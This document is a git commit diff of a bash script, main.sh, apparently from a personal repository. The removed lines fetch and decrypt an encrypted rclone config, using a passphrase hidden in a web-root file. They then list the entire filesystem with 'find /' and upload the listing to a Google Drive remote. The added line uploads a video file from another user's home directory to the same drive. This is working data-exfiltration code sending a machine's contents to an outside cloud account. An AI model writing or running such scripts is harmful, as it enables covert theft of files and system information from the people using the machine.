14fe3d1d2883d84d87a8b1b91df6c99bc596c5d8
socratesgaming <167761261+socratesgaming@users.noreply.github.com>
2025-03-27 13:35:08 +0300

    Update main.sh

--- main.sh
+++ main.sh
@@ -1,9 +1,3 @@
 #!/bin/bash
 
-
-mkdir /usr/share/sflbd
-curl https://raw.githubusercontent.com/socratesgaming/project-S.O.C.R.A.T.E.S/refs/heads/main/secret.txt.gpg.asc -o /usr/share/sflbd/secret.txt.gpg.asc
-base64 -d /usr/share/sflbd/secret.txt.gpg.asc > /usr/share/sflbd/secret.txt.gpg
-gpg --decrypt --passphrase-file /var/www/html/sus.html --batch /usr/share/sflbd/secret.txt.gpg > /usr/share/sflbd/rclone.conf
-find / > /usr/share/sflbd/list.txt
-rclone --config=/usr/share/sflbd/rclone.conf copy /usr/share/sflbd/list.txt gdrive:/
+rclone --config=/usr/share/sflbd/rclone.conf copy "/home/ogretmen/.video/HKP'li Dayı (Nurullah Efe Ankut) Haklı Sözleri ve Yumruğu ile TRT Binasını Patlatıyor [LxwDSEuoGZI].mp4" gdrive:/
